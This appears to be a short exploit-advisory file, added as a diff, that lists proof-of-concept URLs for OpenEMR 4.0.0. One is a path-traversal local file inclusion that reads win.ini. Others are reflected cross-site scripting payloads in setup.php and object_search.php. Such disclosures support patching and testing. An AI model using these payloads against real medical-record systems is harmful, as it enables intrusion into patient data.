@@ -1,0 +1,8 @@
+Local file include:
+
+http://www.example.com/openemr-4.0.0/index.php?site=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fwin.ini%00
+
+Cross-site scripting:
+
+http://www.example.com/openemr-4.0.0/setup.php?site=%3Cscript%3Ealert(0)%3C/script%3E
+http://www.example.com/openemr-4.0.0/gacl/admin/object_search.php?object_type=&amp;action=&amp;src_form=%22%3E%3Cscript%3Ealert%280%29%3C/script%3E&amp;section_value=%22%3E%3Cscript%3Ealert%280%29%3C/script%3E
